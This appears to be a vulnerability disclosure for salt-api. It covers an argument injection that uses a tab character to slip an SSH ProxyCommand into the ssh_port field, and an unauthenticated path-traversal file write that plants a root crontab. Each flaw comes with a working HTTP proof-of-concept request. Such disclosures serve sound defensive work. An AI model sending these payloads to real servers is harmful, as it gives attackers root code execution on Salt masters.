@@ -1,0 +1,42 @@
+Authenticated argument injection in netapi salt-api SSH client
+
+The fix for CVE-2020-16846 escapes the input to the netapi ssh client. However an attacker can still inject arguments using the %09 (tab) character, which are passed through to SSH invocations. For example, the following request will create the "/tmp/rce" file on the salt master. It does require valid credentials, which I have provided in the request.
+
+
+POST /run HTTP/1.1
+Host: 192.168.200.129
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+
+client=ssh&roster=&tgt=*&fun=test.ping&ssh_user=test123&ssh_port=2222%09-o%20ProxyCommand="touch%20/tmp/rce"&ssh_priv=as`id`df&eauth=pam&username=user&password=user
+
+This ends up executing the command :
+
+ssh 192.168.200.131 -o KbdInteractiveAuthentication=no -o PasswordAuthentication=yes -o GSSAPIAuthentication=no -o ConnectTimeout=65 -o Port=2222 -o ProxyCommand=touch /tmp/rce -o IdentityFile=asdf -o User=user /bin/sh  << 'EOF' set -e set -u
+
+which executes the command through the ProxyCommand argument to SSH. Other parameters passed through are also vulnerable such as ssh_priv and ssh_user, as long as they are not defined already in the roster file. Exploiting this also requires at least one roster host to be defined.
+
+
+
+
+==================================
+
+Unauthenticated arbitrary file write in salt-api
+
+The wheel_async client does not check for authentication when it is called. This allows an arbitrary file write in conjunction with a path traversal in the pillar_roots.write function. As the salt-master runs as root by default it can be used to write a new crontab file, which will execute automatically on most linux systems. 
+
+POC:
+--
+
+POST /run HTTP/1.1
+Host: 192.168.200.129
+Content-Length: 187
+Content-Type: application/json;charset=UTF-8
+
+{"token":"1","client":"wheel_async","fun":"pillar_roots.write",
+"arg":[],
+"kwarg": {"data":"* * * * * root /bin/bash -c \"touch /tmp/rce4\"\n","path":"../../../../etc/cron.d/saltrce4"}}
+
+
+--
+After a minute, check in /tmp/ for the rce4 file, which should have been created by the crontab. There are probably other ways to exploit this file write to obtain code execution.
